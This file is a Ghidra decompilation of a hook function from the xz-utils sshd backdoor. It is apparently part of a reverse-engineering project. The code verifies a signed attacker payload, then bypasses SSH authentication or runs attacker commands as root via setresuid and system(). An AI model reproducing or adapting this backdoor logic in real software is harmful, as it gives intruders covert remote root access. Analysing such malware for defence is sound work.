// /home/kali/xzre-ghidra/xzregh/108EA0_mm_answer_keyallowed_hook.c
// Function: mm_answer_keyallowed_hook @ 0x108EA0
// Calling convention: __stdcall
// Prototype: int __stdcall mm_answer_keyallowed_hook(ssh * ssh, int sock, sshbuf * m)
/*
 * AutoDoc: Generated from upstream sources.
 *
 * Source summary (xzre/xzre.h):
 *   @brief runs the payload received from @ref sshd_proxy_elevate,
 *   and then runs the original `mm_answer_keyallowed` function
 *
 *   @param ssh
 *   @param sock
 *   @param m
 *   @return int
 */

int mm_answer_keyallowed_hook(ssh *ssh,int sock,sshbuf *m)

{
  sshd_payload_ctx_t sVar1;
  u32 uVar2;
  libc_imports_t *plVar3;
  sshd_ctx_t *psVar4;
  sshd_monitor_func_t *UNRECOVERED_JUMPTABLE;
  ulong uVar5;
  sshd_ctx_t *psVar6;
  void *pvVar7;
  undefined8 uVar8;
  _func_19 *p_Var9;
  global_context_t *ctx;
  BOOL BVar10;
  gid_t rgid;
  int iVar11;
  long lVar12;
  ulong uVar13;
  ulong uVar14;
  ssize_t sVar15;
  long lVar16;
  ulong uVar17;
  sshbuf *psVar18;
  undefined1 *puVar19;
  u8 *puVar20;
  uid_t ruid;
  sshd_payload_ctx_t *psVar21;
  byte bVar22;
  size_t local_140;
  u8 local_131 [57];
  sshbuf local_f8;
  undefined8 local_aa;
  undefined8 uStack_a2;
  undefined1 local_9a [106];
  
  ctx = global_ctx;
  bVar22 = 0;
  if (global_ctx == (global_context_t *)0x0) {
    return 0;
  }
  plVar3 = global_ctx->libc_imports;
  if (plVar3 == (libc_imports_t *)0x0) {
    return 0;
  }
  psVar4 = global_ctx->sshd_ctx;
  if (psVar4 == (sshd_ctx_t *)0x0) {
    return 0;
  }
  if (global_ctx->payload_data == (u8 *)0x0) {
    return 0;
  }
  UNRECOVERED_JUMPTABLE = psVar4->mm_answer_keyallowed_start;
  if (UNRECOVERED_JUMPTABLE == (sshd_monitor_func_t *)0x0) goto LAB_00109471;
  if (global_ctx->payload_state == 4) goto LAB_0010944f;
  BVar10 = check_backdoor_state(global_ctx);
  if (((BVar10 == 0) || (ctx->payload_state == 4)) || (ctx->payload_state == 0xffffffff))
  goto LAB_00109429;
  psVar18 = &local_f8;
  for (lVar16 = 0x12; lVar16 != 0; lVar16 = lVar16 + -1) {
    *(undefined4 *)&psVar18->d = 0;
    psVar18 = (sshbuf *)((long)psVar18 + (ulong)bVar22 * -8 + 4);
  }
  local_140 = 0;
  BVar10 = sshbuf_extract(m,ctx,&local_f8.d,&local_f8.size);
  if ((BVar10 == 0) ||
     (BVar10 = extract_payload_message(&local_f8,local_f8.size,&local_140,ctx), BVar10 == 0))
  goto LAB_0010944f;
  decrypt_payload_message((key_payload_t *)local_f8.d,local_140,ctx);
  uVar2 = ctx->payload_state;
  if (uVar2 == 3) {
LAB_00109216:
    psVar21 = ctx->sshd_payload_ctx;
    if (psVar21 != (sshd_payload_ctx_t *)0x0) {
      uVar14 = (ulong)*(ushort *)psVar21;
      sVar1 = psVar21[0x3b];
      uVar17 = uVar14 - 0x120;
      if (sVar1 == (sshd_payload_ctx_t)0x2) {
        if ((((ctx->sshd_ctx->mm_answer_keyverify_ptr != (void *)0x0) && (4 < uVar17)) &&
            (uVar17 = (ulong)*(ushort *)(psVar21 + 0xae), *(ushort *)(psVar21 + 0xae) != 0)) &&
           ((uVar17 < uVar14 - 0x122 && (uVar14 = (uVar14 - 0x122) - uVar17, 2 < uVar14)))) {
          *(sshd_payload_ctx_t *)&psVar4->writebuf_size = psVar21[uVar17 + 0xb0];
          *(sshd_payload_ctx_t *)((long)&psVar4->writebuf_size + 1) = (psVar21 + uVar17 + 0xb0)[1];
          if ((psVar4->writebuf_size == 0) || (uVar14 - 2 < (ulong)psVar4->writebuf_size)) {
            psVar4->writebuf_size = 0;
          }
          else {
            psVar6 = ctx->sshd_ctx;
            plVar3 = ctx->libc_imports;
            psVar4->writebuf = (u8 *)(psVar21 + uVar17 + 0xb2);
            pvVar7 = psVar6->mm_answer_keyverify;
            if (pvVar7 != (void *)0x0) {
              *(void **)psVar6->mm_answer_keyverify_ptr = pvVar7;
              sVar15 = fd_write(sock,psVar21 + 0xb0,uVar17,plVar3);
              if (-1 < sVar15) {
                return 0;
              }
              goto LAB_0010944f;
            }
          }
        }
      }
      else if (sVar1 == (sshd_payload_ctx_t)0x3) {
        if (((plVar3->system != (_func_22 *)0x0) && (8 < uVar17)) &&
           (psVar21[uVar14 - 0x73] == (sshd_payload_ctx_t)0x0)) {
          uVar8 = *(undefined8 *)(psVar21 + 0xae);
          rgid = (gid_t)((ulong)uVar8 >> 0x20);
          if (((rgid == 0) || (iVar11 = (*plVar3->setresgid)(rgid,rgid,rgid), iVar11 != -1)) &&
             ((ruid = (uid_t)uVar8, ruid == 0 ||
              (iVar11 = (*plVar3->setresuid)(ruid,ruid,ruid), iVar11 != -1)))) {
            (*plVar3->system)((char *)(psVar21 + 0xb6));
            ctx->payload_state = 4;
            goto LAB_0010944f;
          }
        }
      }
      else if (((sVar1 == (sshd_payload_ctx_t)0x1) &&
               (ctx->sshd_ctx->mm_answer_authpassword_ptr != (sshd_monitor_func_t *)0x0)) &&
              (1 < uVar17)) {
        psVar4->_unknown1181[0] = (u8)psVar21[0xae];
        *(sshd_payload_ctx_t *)(psVar4->_unknown1181 + 1) = psVar21[0xaf];
        if (*(ushort *)psVar4->_unknown1181 == 0) {
          psVar21 = (sshd_payload_ctx_t *)0x0;
        }
        else {
          psVar21 = psVar21 + 0xb0;
          if (uVar14 - 0x122 < (ulong)*(ushort *)psVar4->_unknown1181) {
            psVar4->_unknown1181[0] = '\0';
            psVar4->_unknown1181[1] = '\0';
            goto LAB_00109429;
          }
        }
        *(sshd_payload_ctx_t **)psVar4->_unknown1182 = psVar21;
        ctx->payload_state = 4;
        iVar11 = sshd_patch_variables(1,0,0,0,ctx);
LAB_001092e5:
        if (iVar11 != 0) goto LAB_0010944f;
      }
    }
  }
  else if ((int)uVar2 < 4) {
    if (uVar2 == 0) {
      if (ctx->current_data_size < 0xae) goto LAB_0010944f;
      puVar20 = local_131 + 0x10;
      for (lVar16 = 0x29; lVar16 != 0; lVar16 = lVar16 + -1) {
        *puVar20 = '\0';
        puVar20 = puVar20 + (ulong)bVar22 * -2 + 1;
      }
      psVar21 = (sshd_payload_ctx_t *)ctx->payload_data;
      local_131[0] = '\0';
      local_131[1] = '\0';
      local_131[2] = '\0';
      local_131[3] = '\0';
      local_131[4] = '\0';
      local_131[5] = '\0';
      local_131[6] = '\0';
      local_131[7] = '\0';
      local_131[8] = '\0';
      local_131[9] = '\0';
      local_131[10] = '\0';
      local_131[0xb] = '\0';
      local_131[0xc] = '\0';
      local_131[0xd] = '\0';
      local_131[0xe] = '\0';
      local_131[0xf] = '\0';
      if (((psVar21 != (sshd_payload_ctx_t *)0x0) &&
          (ctx->sshd_sensitive_data != (sensitive_data *)0x0)) &&
         ((ctx->sshd_sensitive_data->host_pubkeys != (sshkey **)0x0 &&
          (ctx->sshd_payload_ctx == (sshd_payload_ctx_t *)0x0)))) {
        ctx->sshd_payload_ctx = psVar21;
        local_aa = 0;
        uStack_a2 = 0;
        puVar19 = local_9a;
        for (lVar16 = 0x4a; lVar16 != 0; lVar16 = lVar16 + -1) {
          *puVar19 = 0;
          puVar19 = puVar19 + (ulong)bVar22 * -2 + 1;
        }
        lVar16 = 0;
        do {
          *(sshd_payload_ctx_t *)((long)&local_aa + lVar16) = psVar21[lVar16 + 2];
          lVar16 = lVar16 + 1;
        } while (lVar16 != 0x3a);
        BVar10 = secret_data_get_decrypted(local_131,ctx);
        if ((BVar10 != 0) &&
           (BVar10 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys
                                      [ctx->sshd_host_pubkey_idx],(u8 *)&local_aa,0x3a,0x5a,
                                      (u8 *)(ctx->sshd_payload_ctx + 0x3c),local_131,ctx),
           BVar10 != 0)) {
          ctx->payload_state = 1;
          puVar20 = local_131;
          for (lVar16 = 0x39; lVar16 != 0; lVar16 = lVar16 + -1) {
            *puVar20 = '\0';
            puVar20 = puVar20 + (ulong)bVar22 * -2 + 1;
          }
          iVar11 = check_backdoor_state(ctx);
          goto LAB_001092e5;
        }
      }
      ctx->payload_state = 0xffffffff;
      ctx->sshd_payload_ctx = (sshd_payload_ctx_t *)0x0;
    }
    else if ((uVar2 == 1) && (ctx->sshd_payload_ctx != (sshd_payload_ctx_t *)0x0)) {
      uVar14 = (ulong)*(ushort *)ctx->sshd_payload_ctx;
      uVar17 = ctx->current_data_size;
      if (uVar17 <= uVar14) {
        if (uVar17 != uVar14) goto LAB_0010944f;
        uVar14 = ctx->payload_data_size;
        uVar5 = ctx->sock_read_buf_size;
        if ((uVar14 < uVar5) || (uVar17 = uVar17 - 0x72, uVar14 - uVar5 <= uVar17)) {
LAB_00109471:
          if (plVar3->exit != (_func_19 *)0x0) {
            (*plVar3->exit)(0);
          }
          return 0;
        }
        local_aa = 0;
        uStack_a2 = 0;
        puVar19 = local_9a;
        for (lVar16 = 0x62; lVar16 != 0; lVar16 = lVar16 + -1) {
          *puVar19 = 0;
          puVar19 = puVar19 + (ulong)bVar22 * -2 + 1;
        }
        puVar20 = ctx->payload_data;
        lVar16 = 0;
        do {
          lVar12 = lVar16 + 1;
          *(u8 *)((long)&local_aa + lVar16) = puVar20[lVar16 + uVar17];
          lVar16 = lVar12;
        } while (lVar12 != 0x72);
        if ((uVar14 < uVar17) || (uVar13 = 0, uVar14 - uVar17 < uVar5)) goto LAB_00109471;
        for (; uVar5 != uVar13; uVar13 = uVar13 + 1) {
          puVar20[uVar13 + uVar17] = ctx->sock_read_buf[uVar13];
        }
        BVar10 = verify_signature(ctx->sshd_sensitive_data->host_pubkeys[ctx->sshd_host_pubkey_idx],
                                  ctx->payload_data,uVar17 + ctx->sock_read_buf_size,
                                  ctx->payload_data_size,(u8 *)&local_aa,
                                  (u8 *)(ctx->sshd_payload_ctx + 2),ctx);
        if (BVar10 == 0) {
          ctx->payload_state = 0xffffffff;
          goto LAB_00109471;
        }
        ctx->payload_state = 3;
        goto LAB_00109216;
      }
    }
  }
  else if (uVar2 == 4) goto LAB_0010944f;
LAB_00109429:
  if (((ctx->libc_imports != (libc_imports_t *)0x0) &&
      (p_Var9 = ctx->libc_imports->exit, p_Var9 != (_func_19 *)0x0)) &&
     (ctx->payload_state = 0xffffffff, ctx->exit_flag != 0)) {
    (*p_Var9)(0);
  }
LAB_0010944f:
                    /* WARNING: Could not recover jumptable at 0x0010946f. Too many branches */
                    /* WARNING: Treating indirect jump as call */
  iVar11 = (*(code *)UNRECOVERED_JUMPTABLE)(ssh,sock,m);
  return iVar11;
}

